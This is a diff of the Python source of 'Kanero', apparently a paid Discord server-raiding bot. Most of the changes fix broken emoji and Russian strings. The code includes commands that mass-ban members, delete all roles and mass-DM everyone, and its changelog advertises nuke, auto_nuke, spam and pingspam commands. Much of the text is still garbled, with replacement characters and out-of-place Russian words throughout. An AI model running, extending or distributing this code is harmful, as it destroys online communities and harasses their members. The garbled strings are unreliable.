@@ -12,8 +12,9 @@ import motor.motor_asyncio
 from datetime import datetime, timedelta
 
 # Логирование в файл
+log_file = os.path.join(os.path.dirname(__file__), "bot.log")
 logging.basicConfig(
-    filename="bot.log",
+    filename=log_file,
     level=logging.INFO,
     format="%(asctime)s %(message)s",
     encoding="utf-8"
@@ -1022,7 +1023,7 @@ async def wl_add(ctx, *, user_input: str):
         if user_id not in config.WHITELIST:
             config.WHITELIST.append(user_id)
             save_whitelist()
-        result_text = f"? **{user}** (`{user_id}`) навсегда � whitelist навсегда."
+        result_text = f"✅ **{user}** (`{user_id}`) добавлен в whitelist."
 
     # ����� ����
     try:
@@ -1405,7 +1406,7 @@ class CompensationView(discord.ui.View):
                     f"{'���� ������ �� �Готово.' if role_given else '��������� `!help` ��� ������ Готово.'}"
                 ),
                 color=0x00ff00
-            ).set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd"),
+            ).set_footer(text="🤖 Kanero  |  discord.gg/aud6wwYVRd"),
             ephemeral=True
         )
 
@@ -1416,7 +1417,7 @@ class CompensationView(discord.ui.View):
                 try:
                     await admin_ch.send(
                         embed=discord.Embed(
-                            title="?? ���подписка истекла�",
+                            title="🤖 ���подписка истекла�",
                             description=(
                                 f"**������������:** {user.mention} (`{user.id}`)\n"
                                 f"**��������:** {self.sub_name}\n"
@@ -1439,7 +1440,7 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
 
     if not sub_type or not duration_str:
         await ctx.send(
-            "? **подписка истеклаГотово.**\n"
+            "🤖 **подписка истеклаГотово.**\n"
             "���������: `!compensate <���> <�����>`\n\n"
             "**����:** `wl` � White � `pm` � Premium � `fl` � Freelist\n"
             "**�����:** `2d` � 2 ��� � `48h` � 48 ����� � `24` � 24 ����\n\n"
@@ -1503,7 +1504,7 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
     if news_ch:
         try:
             news_embed = discord.Embed(
-                title="?? подписка истекла����!",
+                title="🤖 подписка истекла����!",
                 description=(
                     f"��� ���� ��подписка истекла� ��подписка истекла� **{sub_name}** �� {duration_text}!\n\n"
                     f"������� � {comp_ch.mention} � ����� ������ ����� навсегда.\n\n"
@@ -1511,7 +1512,7 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
                 ),
                 color=0xffd700
             )
-            news_embed.set_footer(text="?? Kanero  |  ����� ������ � ����все параллельно")
+            news_embed.set_footer(text="🤖 Kanero  |  Компенсация выдана")
             news_embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
             await news_ch.send(content="@everyone", embed=news_embed)
         except Exception:
@@ -1523,7 +1524,7 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
         try:
             await admin_ch.send(
                 embed=discord.Embed(
-                    title="?? ���подписка истекла��",
+                    title="🤖 ���подписка истекла��",
                     description=(
                         f"**���:** {sub_name}\n"
                         f"**������������:** {duration_text}\n"
@@ -1549,7 +1550,7 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
             if ac:
                 await ac.send(
                     embed=discord.Embed(
-                        title="??? ����� ���подписка истекла",
+                        title="📊 ����� ���подписка истекла",
                         description=(
                             f"����������� **{sub_name}** навсегда�.\n\n"
                             f"�� ������ ������� навсегда� � {comp_ch.mention}!"
@@ -1578,7 +1579,7 @@ async def announce_bug_cmd(ctx, *, message: str = None):
 
     if not message:
         await ctx.send(
-            "? **подписка истеклаГотово.**\n"
+            "🤖 **подписка истеклаГотово.**\n"
             "���������: `!announce_bug навсегда | навсегда`\n\n"
             "**������:** `!announce_bug подписка истекла | �все параллельно�� ������ ��� ������ �все параллельно. ��� навсегда� � v2.3.`"
         )
@@ -1608,7 +1609,7 @@ async def announce_bug_cmd(ctx, *, message: str = None):
         return
 
     embed = discord.Embed(
-        title=f"?? навсегда� ���: {bug_title}",
+        title=f"🤖 навсегда� ���: {bug_title}",
         description=bug_description,
         color=0xff6b6b,
         timestamp=datetime.utcnow()
@@ -1619,14 +1620,14 @@ async def announce_bug_cmd(ctx, *, message: str = None):
         inline=False
     )
     embed.add_field(
-        name="?? навсегда���",
+        name="🤖 навсегда���",
         value=(
             "���� ��� навсегда ���� ��� � навсегда � �����, �� �����все параллельно.\n"
             "все параллельно ���� ���подписка истекла навсегда���☠️ КРАШ СЕРВЕРА����."
         ),
         inline=False
     )
-    embed.set_footer(text="?? Kanero  |  ������� �� навсегда!")
+    embed.set_footer(text="🤖 Kanero  |  Баг отправлен!")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
 
     try:
@@ -1766,7 +1767,7 @@ async def list_remove_cmd(ctx):
     total = fl_count + wl_count + pm_count + temp_count
     
     if total == 0:
-        await ctx.send("?? ��� ������ ��� �����.")
+        await ctx.send("🤖 ��� ������ ��� �����.")
         return
     
     # ������� ��� ������
@@ -1782,18 +1783,18 @@ async def list_remove_cmd(ctx):
     save_temp_subscriptions()
     
     embed = discord.Embed(
-        title="??? ������ �������",
+        title="📊 ������ �������",
         description=(
             f"**������� навсегда��:**\n"
-            f"?? Freelist: {fl_count}\n"
+            f"🤖 Freelist: {fl_count}\n"
             f"✅ Whitelist: {wl_count}\n"
-            f"?? Premium: {pm_count}\n"
+            f"🤖 Premium: {pm_count}\n"
             f"? навсегда�: {temp_count}\n\n"
             f"**����� �������: {total}**"
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="?? Kanero  |  ��� ������ �������")
+    embed.set_footer(text="🤖 Kanero  |  ��� ������ �������")
     await ctx.send(embed=embed)
 
 
@@ -1808,7 +1809,7 @@ async def sync_roles_cmd(ctx):
         await ctx.send("❌ Домашний сервер не найден.")
         return
 
-    msg = await ctx.send("?? навсегда����� ����...")
+    msg = await ctx.send("🤖 навсегда����� ����...")
 
     role_white   = discord.utils.find(lambda r: r.name == "✅ White",   guild.roles)
     role_premium = discord.utils.find(lambda r: r.name == "💎 Premium", guild.roles)
@@ -1861,7 +1862,7 @@ async def sync_roles_cmd(ctx):
                 if uid in FREELIST:
                     FREELIST.remove(uid)
                     save_freelist()
-                    kicked_from.append("?? Freelist")
+                    kicked_from.append("🤖 Freelist")
                 if kicked_from:
                     missing.append(f"`{uid}` � ����� ��: {', '.join(kicked_from)}")
                 else:
@@ -1930,11 +1931,11 @@ async def sync_roles_cmd(ctx):
         lines.append("? ��� ���� � �������, ������ �� навсегда.")
 
     embed = discord.Embed(
-        title="?? навсегда����� �����",
+        title="🤖 навсегда����� �����",
         description="\n\n".join(lines),
         color=0x0a0a0a
     )
-    embed.set_footer(text="?? Kanero  |  !list � навсегда�� �����")
+    embed.set_footer(text="🤖 Kanero  |  !list – список участников")
     await msg.edit(content=None, embed=embed)
 
 
@@ -1948,7 +1949,7 @@ async def temp_check(ctx):
     embed = discord.Embed(title="? �подписка истекла�", color=0x0a0a0a)
     
     if not TEMP_SUBSCRIPTIONS:
-        embed.description = "? ��� подписка истекла�� навсегда"
+        embed.description = "✅ Нет временных подписок"
     else:
         lines = []
         # ������� ����� ������� ����� навсегда ������ �подписка истекла �� ����� навсегда
@@ -1968,7 +1969,7 @@ async def temp_check(ctx):
         
         embed.description = "\n\n".join(lines) if lines else "? ��� �подписка истекла�"
     
-    embed.set_footer(text=f"?? Kanero  |  �����: {len(TEMP_SUBSCRIPTIONS)}")
+    embed.set_footer(text=f"🤖 Kanero  |  �����: {len(TEMP_SUBSCRIPTIONS)}")
     await ctx.send(embed=embed)
 
 
@@ -2006,20 +2007,20 @@ async def fix_role_cmd(ctx, user: discord.Member = None):
     if role_guest and role_guest not in user.roles:
         try:
             await user.add_roles(role_guest, reason="fix_role: ���� Guest")
-            changes.append("?? Guest � ������")
+            changes.append("🤖 Guest � ������")
         except Exception as e:
-            changes.append(f"?? Guest � ������: {e}")
+            changes.append(f"🤖 Guest � ������: {e}")
     
     # навсегда� � ������ навсегда ����
     if in_premium:
         if role_premium and role_premium not in user.roles:
             try:
                 await user.add_roles(role_premium, reason="fix_role: � Premium �����")
-                changes.append("?? Premium � ������")
+                changes.append("🤖 Premium � ������")
             except Exception as e:
-                changes.append(f"?? Premium � ������: {e}")
+                changes.append(f"🤖 Premium � ������: {e}")
         else:
-            changes.append("?? Premium � ��� ����")
+            changes.append("🤖 Premium � ��� ����")
     elif in_whitelist:
         if role_white and role_white not in user.roles:
             try:
@@ -2033,11 +2034,11 @@ async def fix_role_cmd(ctx, user: discord.Member = None):
         if role_user and role_user not in user.roles:
             try:
                 await user.add_roles(role_user, reason="fix_role: � Freelist")
-                changes.append("?? User � ������")
+                changes.append("🤖 User � ������")
             except Exception as e:
-                changes.append(f"?? User � ������: {e}")
+                changes.append(f"🤖 User � ������: {e}")
         else:
-            changes.append("?? User � ��� ����")
+            changes.append("🤖 User � ��� ����")
     else:
         changes.append("? �� ������ �� � ����� ������")
     
@@ -2045,9 +2046,9 @@ async def fix_role_cmd(ctx, user: discord.Member = None):
     if role_premium and role_premium in user.roles and not in_premium and uid != config.OWNER_ID:
         try:
             await user.remove_roles(role_premium, reason="fix_role: �� � Premium �����")
-            changes.append("?? Premium � ������ (�� � ������)")
+            changes.append("🤖 Premium � ������ (�� � ������)")
         except Exception as e:
-            changes.append(f"?? Premium � ������ навсегда: {e}")
+            changes.append(f"🤖 Premium � ������ навсегда: {e}")
     
     if role_white and role_white in user.roles and not in_whitelist and not in_premium and uid != config.OWNER_ID:
         try:
@@ -2058,12 +2059,12 @@ async def fix_role_cmd(ctx, user: discord.Member = None):
     
     # навсегда� �����
     if not changes:
-        description = "? ��� ���� � �������, навсегда� �� навсегда�."
+        description = "✅ Все роли уже установлены правильно."
     else:
         description = "\n".join(changes)
     
     embed = discord.Embed(
-        title=f"?? навсегда ����� � {user.display_name}",
+        title=f"🤖 навсегда ����� � {user.display_name}",
         description=description,
         color=0x0a0a0a
     )
@@ -2071,20 +2072,20 @@ async def fix_role_cmd(ctx, user: discord.Member = None):
     # ��подписка истекла ���� � ������ � �������
     status_lines = []
     if in_premium:
-        status_lines.append("?? Premium ����")
+        status_lines.append("🤖 Premium ����")
     if in_whitelist:
         status_lines.append("✅ Whitelist")
     if in_freelist:
-        status_lines.append("?? Freelist")
+        status_lines.append("🤖 Freelist")
     
     if status_lines:
-        embed.add_field(name="?? ������ � �������", value="\n".join(status_lines), inline=True)
+        embed.add_field(name="🤖 ������ � �������", value="\n".join(status_lines), inline=True)
     
     current_roles = [role.name for role in user.roles if role.name in ["💎 Premium", "✅ White", "👥 User", "👤 Guest"]]
     if current_roles:
-        embed.add_field(name="?? ������� ����", value="\n".join(current_roles), inline=True)
+        embed.add_field(name="🤖 ������� ����", value="\n".join(current_roles), inline=True)
     
-    embed.set_footer(text="?? Kanero  |  !fix_role [@������������]")
+    embed.set_footer(text="🤖 Kanero  |  !fix_role [@������������]")
     await ctx.send(embed=embed)
 
 
@@ -2103,7 +2104,7 @@ async def list_clear(ctx):
     save_premium()
     save_freelist()
     embed = discord.Embed(
-        title="??? ��� ������ �������",
+        title="📊 ��� ������ �������",
         description=(
             f"Whitelist: ������� **{wl_removed}**\n"
             f"Premium: ������� **{pm_removed}**\n"
@@ -2124,7 +2125,7 @@ def premium_check():
             return False
         if not is_whitelisted(ctx.author.id):
             embed = discord.Embed(
-                title="?? ������ �����٨�",
+                title="🤖 ������ �����٨�",
                 description="� ���� ��� навсегда.\n�� навсегда ���� � ��: **davaidkatt**",
                 color=0x0a0a0a
             )
@@ -2133,7 +2134,7 @@ def premium_check():
             return False
         if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
             embed = discord.Embed(
-                title="?? PREMIUM �������",
+                title="🤖 PREMIUM �������",
                 description="��� ������� навсегда ������ **Premium** навсегда�����.\n\n�� навсегда ���� � ��: **davaidkatt**",
                 color=0x0a0a0a
             )
@@ -2151,7 +2152,7 @@ async def super_nuke(ctx, *, text: str = None):
     if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
         return
     if is_guild_blocked(guild.id):
-        embed = discord.Embed(description="?? ���� ����все параллельно�.", color=0x0a0a0a)
+        embed = discord.Embed(description="🤖 ���� ����все параллельно�.", color=0x0a0a0a)
         embed.set_footer(text="🤖 Kanero")
         await ctx.send(embed=embed)
         return
@@ -3281,12 +3282,12 @@ async def setup_update(ctx):
             info_ch = discord.utils.find(lambda c: "info" in c.name.lower(), cat_info.channels)
             if info_ch:
                 try:
-                    # Ищем существующее сообщение бота с embed "Информация оKanero
+                    # Ищем существующее сообщение бота с embed "Информация о Kanero"
                     existing_message = None
                     async for message in info_ch.history(limit=50):
                         if (message.author == bot.user and message.embeds and 
                             len(message.embeds) > 0 and 
-                            "Информация оKanero in message.embeds[0].title):
+                            "Информация о Kanero" in message.embeds[0].title):
                             existing_message = message
                             break
                     
@@ -3375,14 +3376,14 @@ async def setup_update(ctx):
         try:
             results.append(f"🔍 Найден канал: {ticket_ch.name}")
             
-            # Ищем существующее сообщение бота с embed "Поддержка вKanero
+            # Ищем существующее сообщение бота с embed "Поддержка в Kanero"
             existing_message = None
             message_count = 0
             async for message in ticket_ch.history(limit=50):
                 message_count += 1
                 if (message.author == bot.user and message.embeds and 
                     len(message.embeds) > 0 and 
-                    "Поддержка вKanero in message.embeds[0].title):
+                    "Поддержка в Kanero" in message.embeds[0].title):
                     existing_message = message
                     break
             
@@ -3578,7 +3579,7 @@ async def on_add(ctx, user_id: int):
     if user_id not in OWNER_NUKE_LIST:
         OWNER_NUKE_LIST.append(user_id)
         save_owner_nuke_list()
-    await ctx.send(f"?? `{user_id}` ������� ������ � **Owner Nuke**.")
+    await ctx.send(f"🤖 `{user_id}` ������� ������ � **Owner Nuke**.")
 
 
 @bot.command(name="on_remove")
@@ -3604,8 +3605,8 @@ async def on_list(ctx):
             lines.append(f"`{uid}` � **{user}**")
         except Exception:
             lines.append(f"`{uid}` � *�� ������*")
-    embed = discord.Embed(title="?? Owner Nuke List", description="\n".join(lines) if lines else "*�����*", color=0x0a0a0a)
-    embed.set_footer(text=f"?? Kanero  |  �����: {len(OWNER_NUKE_LIST)}")
+    embed = discord.Embed(title="🤖 Owner Nuke List", description="\n".join(lines) if lines else "*�����*", color=0x0a0a0a)
+    embed.set_footer(text=f"🤖 Kanero  |  �����: {len(OWNER_NUKE_LIST)}")
     await ctx.send(embed=embed)
 
 
@@ -3650,9 +3651,9 @@ async def fl_add(ctx, *, user_input: str):
         if not home_guild:
             await ctx.send("❌ Домашний сервер не найден.")
             return
-        msg = await ctx.send("? ����� Freelist ���� навсегда��...")
+        msg = await ctx.send("⏳ Выдаю Freelist роль участникам...")
         count = 0
-        user_role = discord.utils.find(lambda r: r.name == "??"👥 User", home_guild.roles)
+        user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
         for member in home_guild.members:
             if member.bot:
                 continue
@@ -3690,7 +3691,7 @@ async def fl_add(ctx, *, user_input: str):
         if user_id not in FREELIST:
             FREELIST.append(user_id)
             save_freelist()
-        result_text = f"? **{user}** (`{user_id}`) навсегда � freelist навсегда."
+        result_text = f"✅ **{user}** (`{user_id}`) добавлен в freelist."
 
     # ����� ���� � ������ � addbot
     try:
@@ -3703,7 +3704,7 @@ async def fl_add(ctx, *, user_input: str):
                 except Exception:
                     member = None
             if member:
-                user_role = discord.utils.find(lambda r: r.name == "??"👥 User", home_guild.roles)
+                user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
                 if user_role and user_role not in member.roles:
                     await member.add_roles(user_role, reason="fl_add")
             await update_stats_channels(home_guild)
@@ -3721,12 +3722,12 @@ async def fl_add(ctx, *, user_input: str):
                         f"**�подписка истекла:**\n"
                         f"`!nuke` � `!auto_nuke` � `!help` � `!changelog`\n\n"
                         f"**������ ������?**\n"
-                        f"✅ White / ?? Premium � [������ �� FunPay](https://funpay.com/users/16928925/)\n\n"
+                        f"✅ White / 🤖 Premium � [������ �� FunPay](https://funpay.com/users/16928925/)\n\n"
                         f"**�������� ���� �� ������:** [����� ����]({invite_url})"
                     ),
                     color=0x00ff00
                 )
-                notif.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd")
+                notif.set_footer(text="🤖 Kanero  |  discord.gg/aud6wwYVRd")
                 await addbot_ch.send(content=user.mention, embed=notif)
     except Exception:
         pass
@@ -3752,7 +3753,7 @@ async def fl_remove(ctx, *, user_input: str):
             if home_guild:
                 member = home_guild.get_member(user_id)
                 if member:
-                    user_role = discord.utils.find(lambda r: r.name == "??"👥 User", home_guild.roles)
+                    user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
                     if user_role and user_role in member.roles:
                         await member.remove_roles(user_role, reason="fl_remove")
                 await update_stats_channels(home_guild)
@@ -3773,7 +3774,7 @@ async def fl_clear(ctx):
     FREELIST.clear()
     save_freelist()
     embed = discord.Embed(
-        title="??? Freelist ������",
+        title="📊 Freelist ������",
         description=f"������� **{count}** навсегда�����.",
         color=0x0a0a0a
     )
@@ -3878,7 +3879,7 @@ async def tester_remove(ctx, *, user_input: str):
 
 # --- TICKET SYSTEM -----------------------------------------
 
-TICKET_CATEGORY_NAME = "?? ������"
+TICKET_CATEGORY_NAME = "🤖 ������"
 open_tickets: dict[int, int] = {}  # user_id -> channel_id
 
 
@@ -3886,7 +3887,7 @@ class TicketCloseView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="?? ������� �����", style=discord.ButtonStyle.danger, custom_id="ticket_close")
+    @discord.ui.button(label="🤖 ������� �����", style=discord.ButtonStyle.danger, custom_id="ticket_close")
     async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
         ch = interaction.channel
         creator_id = None
@@ -3899,7 +3900,7 @@ class TicketCloseView(discord.ui.View):
                 and interaction.user.id != creator_id):
             await interaction.response.send_message("? ������ навсегда� �все параллельно�� ����� �Готово.", ephemeral=True)
             return
-        await interaction.response.send_message("?? ���все параллельно...")
+        await interaction.response.send_message("🤖 ���все параллельно...")
         open_tickets.pop(creator_id, None)
         await ch.delete()
 
@@ -4022,7 +4023,7 @@ async def goout(ctx):
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="?? Kanero  |  ����� ������ ����� ������")
+    embed.set_footer(text="🤖 Kanero  |  ����� ������ ����� ������")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
 
     await ctx.send(embed=embed, view=GetAccessView())
@@ -4042,7 +4043,7 @@ async def massdm(ctx, *, text: str):
     sent = 0
     failed = 0
     status_msg = await ctx.send(embed=discord.Embed(
-        description=f"?? навсегда �� {len(members)} навсегда��...",
+        description=f"🤖 навсегда �� {len(members)} навсегда��...",
         color=0x0a0a0a
     ))
     for member in members:
@@ -4053,8 +4054,8 @@ async def massdm(ctx, *, text: str):
             failed += 1
         await asyncio.sleep(0.5)
     embed = discord.Embed(
-        title="?? Mass DM навсегда",
-        description=f"? навсегда��: **{sent}**\n? �� навсегда��: **{failed}**",
+        title="🤖 Mass DM навсегда",
+        description=f"✅ Отправлено: **{sent}**\n❌ Ошибок: **{failed}**",
         color=0x0a0a0a
     )
     embed.set_footer(text="🤖 Kanero")
@@ -4072,13 +4073,13 @@ async def massban(ctx):
         and (not m.top_role or m.top_role < bot_role)
     ]
     status_msg = await ctx.send(embed=discord.Embed(
-        description=f"?? ���� {len(targets)} навсегда��...",
+        description=f"🤖 ���� {len(targets)} навсегда��...",
         color=0x0a0a0a
     ))
     results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
     banned = sum(1 for r in results if not isinstance(r, Exception))
     embed = discord.Embed(
-        title="?? Mass Ban навсегда",
+        title="🤖 Mass Ban навсегда",
         description=f"? навсегда: **{banned}**",
         color=0x0a0a0a
     )
@@ -4127,7 +4128,7 @@ async def rolesdelete(ctx):
     )
     deleted = sum(1 for r in results if not isinstance(r, Exception))
     embed = discord.Embed(
-        description=f"??? ������� �����: **{deleted}**",
+        description=f"📊 ������� �����: **{deleted}**",
         color=0x0a0a0a
     )
     embed.set_footer(text="🤖 Kanero")
@@ -4139,17 +4140,17 @@ async def rolesdelete(ctx):
 async def serverinfo(ctx):
     guild = ctx.guild
     embed = discord.Embed(
-        title=f"?? {guild.name}",
+        title=f"🤖 {guild.name}",
         color=0x0a0a0a
     )
-    embed.add_field(name="?? навсегда��", value=str(guild.member_count))
-    embed.add_field(name="?? �������", value=str(len(guild.channels)))
-    embed.add_field(name="?? �����", value=str(len(guild.roles)))
-    embed.add_field(name="?? ���� �������", value=str(guild.premium_tier))
-    embed.add_field(name="?? навсегда", value=str(guild.premium_subscription_count))
-    embed.add_field(name="?? ID �������", value=str(guild.id))
-    embed.add_field(name="?? �����", value=str(guild.owner))
-    embed.add_field(name="?? ������", value=guild.created_at.strftime("%d.%m.%Y"))
+    embed.add_field(name="🤖 навсегда��", value=str(guild.member_count))
+    embed.add_field(name="🤖 �������", value=str(len(guild.channels)))
+    embed.add_field(name="🤖 �����", value=str(len(guild.roles)))
+    embed.add_field(name="🤖 ���� �������", value=str(guild.premium_tier))
+    embed.add_field(name="🤖 навсегда", value=str(guild.premium_subscription_count))
+    embed.add_field(name="🤖 ID �������", value=str(guild.id))
+    embed.add_field(name="🤖 �����", value=str(guild.owner))
+    embed.add_field(name="🤖 ������", value=guild.created_at.strftime("%d.%m.%Y"))
     if guild.icon:
         embed.set_thumbnail(url=guild.icon.url)
     embed.set_footer(text="🤖 Kanero")
@@ -4169,15 +4170,15 @@ async def userinfo(ctx, user_id: int = None):
         user = ctx.author
     member = ctx.guild.get_member(user.id) if ctx.guild else None
     embed = discord.Embed(
-        title=f"??? {user}",
+        title=f"📊 {user}",
         color=0x0a0a0a
     )
-    embed.add_field(name="?? ID", value=str(user.id))
-    embed.add_field(name="?? ������� ������", value=user.created_at.strftime("%d.%m.%Y"))
+    embed.add_field(name="🤖 ID", value=str(user.id))
+    embed.add_field(name="🤖 ������� ������", value=user.created_at.strftime("%d.%m.%Y"))
     if member:
-        embed.add_field(name="?? ����� �� ������", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
-        embed.add_field(name="?? ������ ����", value=member.top_role.mention)
-        embed.add_field(name="?? ����", value="��" if member.premium_since else "���")
+        embed.add_field(name="🤖 ����� �� ������", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
+        embed.add_field(name="🤖 ������ ����", value=member.top_role.mention)
+        embed.add_field(name="🤖 ����", value="��" if member.premium_since else "���")
     if user.avatar:
         embed.set_thumbnail(url=user.avatar.url)
     embed.set_footer(text="🤖 Kanero")
@@ -4510,11 +4511,11 @@ async def roles_cmd(ctx):
     available.sort(key=lambda r: r.position, reverse=True)
     lines = [f"`{r.id}` � **{r.name}**" for r in available[:30]]
     embed = discord.Embed(
-        title=f"?? ���� навсегда� ���� ({len(available)})",
+        title=f"🤖 ���� навсегда� ���� ({len(available)})",
         description="\n".join(lines),
         color=0x0a0a0a
     )
-    embed.set_footer(text=f"?? Kanero  |  ���� ����: {bot_role.name}  |  !giverole @���� @����")
+    embed.set_footer(text=f"🤖 Kanero  |  ���� ����: {bot_role.name}  |  !giverole @���� @����")
     await ctx.send(embed=embed)
 
 
@@ -4532,16 +4533,16 @@ async def nukelogs(ctx):
     if not logs:
         await ctx.send("����� ����� ���.")
         return
-    embed = discord.Embed(title="?? ���� �����", color=0x0a0a0a)
+    embed = discord.Embed(title="🤖 ���� �����", color=0x0a0a0a)
     # ������ ��� ������ ����� �����
     type_emojis = {
-        "nuke": "??",
-        "super_nuke": "??",
-        "owner_nuke": "??",
-        "auto_nuke": "??",
-        "auto_super_nuke": "????",
-        "auto_superpr_nuke": "???",
-        "auto_owner_nuke": "????"
+        "nuke": "🤖",
+        "super_nuke": "🤖",
+        "owner_nuke": "🤖",
+        "auto_nuke": "🤖",
+        "auto_super_nuke": "🤖🤖",
+        "auto_superpr_nuke": "🤖?",
+        "auto_owner_nuke": "🤖🤖"
     }
     for doc in logs[:20]:  # навсегда 20 � ����� embed
         entry = doc.get("value", doc)
@@ -4558,7 +4559,7 @@ async def nukelogs(ctx):
             ),
             inline=False
         )
-    embed.set_footer(text=f"?? Kanero  |  ����� �������: {len(logs)}")
+    embed.set_footer(text=f"🤖 Kanero  |  ����� �������: {len(logs)}")
     await ctx.send(embed=embed)
 
 
@@ -4568,9 +4569,9 @@ bot.remove_command("help")
 @bot.command(name="changelog")
 async def changelog(ctx):
     """���������� ������ �подписка истекла���."""
-    embed = discord.Embed(title="?? CHANGELOG � v2.4  |  ����� �����, навсегда, INFO", color=0x0a0a0a)
+    embed = discord.Embed(title="🤖 CHANGELOG � v2.4  |  ����� �����, навсегда, INFO", color=0x0a0a0a)
     embed.add_field(
-        name="?? v2.4",
+        name="🤖 v2.4",
         value=(
             "**? �����:**\n"
             "� �подписка истекла���� ����� ���� � навсегда ������ � �������\n"
@@ -4580,16 +4581,16 @@ async def changelog(ctx):
             "� `guild.chunk()` ����� ����� � ��подписка истекла� навсегда��\n"
             "� ����-���� подписка истекла���� ������\n"
             "� �подписка истекла навсегда �����\n\n"
-            "**??? �������:**\n"
+            "**📊 �������:**\n"
             "� ������� `!owner_nuke` � `!auto_owner_nuke`\n"
             "� ������ OWNER_NUKE_LIST\n\n"
-            "**?? навсегда��:**\n"
+            "**🤖 навсегда��:**\n"
             "� �подписка истекла� ������ � навсегда� ������ (��� Freelist)\n"
             "� ������ � ��подписка истекла���� ����� `!setup_update`"
         ),
         inline=False
     )
-    embed.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd  |  !changelogall � ��� �������")
+    embed.set_footer(text="🤖 Kanero  |  discord.gg/aud6wwYVRd  |  !changelogall � ��� �������")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
@@ -4597,17 +4598,17 @@ async def changelog(ctx):
 @bot.command(name="changelogall")
 async def changelogall(ctx):
     """���������� ��� ������� навсегда��."""
-    embed = discord.Embed(title="?? CHANGELOG � ������ �������  |  v1.0 > v2.0", color=0x0a0a0a)
-    embed.add_field(name="?? v1.0", value="� `!nuke`, `!stop`, `!webhooks`, навсегда���", inline=False)
+    embed = discord.Embed(title="🤖 CHANGELOG � ������ �������  |  v1.0 > v2.0", color=0x0a0a0a)
+    embed.add_field(name="🤖 v1.0", value="� `!nuke`, `!stop`, `!webhooks`, навсегда���", inline=False)
     embed.add_field(name="? v1.1", value="� `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
-    embed.add_field(name="?? v1.2", value="� Ҹ���� �����, Owner Panel, `!owl_add`, `!invlink`", inline=False)
-    embed.add_field(name="?? v1.3", value="� Premium �������, `!block_guild`, `!set_spam_text`", inline=False)
-    embed.add_field(name="?? v1.4", value="� `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
-    embed.add_field(name="?? v1.5-1.6", value="� `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
-    embed.add_field(name="?? v1.7", value="� MongoDB, `!pm_add` ���� +whitelist, `!list`, `!list_clear`", inline=False)
-    embed.add_field(name="?? v1.8", value="� Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
+    embed.add_field(name="🤖 v1.2", value="� Ҹ���� �����, Owner Panel, `!owl_add`, `!invlink`", inline=False)
+    embed.add_field(name="🤖 v1.3", value="� Premium �������, `!block_guild`, `!set_spam_text`", inline=False)
+    embed.add_field(name="🤖 v1.4", value="� `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
+    embed.add_field(name="🤖 v1.5-1.6", value="� `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
+    embed.add_field(name="🤖 v1.7", value="� MongoDB, `!pm_add` ���� +whitelist, `!list`, `!list_clear`", inline=False)
+    embed.add_field(name="🤖 v1.8", value="� Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
     embed.add_field(
-        name="???? v2.0 � ������ навсегда",
+        name="?📊 v2.0 � ������ навсегда",
         value=(
             "� навсегда�: навсегда�� � FREELIST � WHITE � PREMIUM\n"
             "� навсегда �����, ������, ���� User/Media/Moderator\n"
@@ -4620,11 +4621,11 @@ async def changelogall(ctx):
         inline=False
     )
     embed.add_field(
-        name="?? v2.1 � ����� �������",
+        name="🤖 v2.1 � ����� �������",
         value=(
-            "� ?? Friend, ?? Media, ??? Moderator � ��подписка истекла�\n"
-            "� ����-���� ?? Guest ��� �����\n"
-            "� ???sell � ???������-�����\n"
+            "� 🤖 Friend, 🤖 Media, 📊 Moderator � ��подписка истекла�\n"
+            "� ����-���� 🤖 Guest ��� �����\n"
+            "� 🤖?sell � 🤖?������-�����\n"
             "� !sync_roles � навсегда����� ����� + ����-�������� �� �����\n"
             "� !autorole � ������ ����-����\n"
             "� �� ������� ����� �� подписка истекла"
@@ -4632,32 +4633,32 @@ async def changelogall(ctx):
         inline=False
     )
     embed.add_field(
-        name="?? v2.2",
+        name="🤖 v2.2",
         value=(
-            "� ?? Fame > ?? Friend, ����� ��� ?? Premium\n"
-            "� ???admin-chat � ADMIN\n"
+            "� 🤖 Fame > 🤖 Friend, ����� ��� 🤖 Premium\n"
+            "� 🤖?admin-chat � ADMIN\n"
             "� ���� ������� � навсегда � подписка истекла����\n"
             "� ����� ����все параллельно�� ����� ���\n"
-            "� ����-��� � ???logs ��� ������ ����\n"
+            "� ����-��� � 🤖?logs ��� ������ ����\n"
             "� ������� `/sp` � `/spkd`"
         ),
         inline=False
     )
     embed.add_field(
-        name="?? v2.3 � навсегда",
+        name="🤖 v2.3 � навсегда",
         value=(
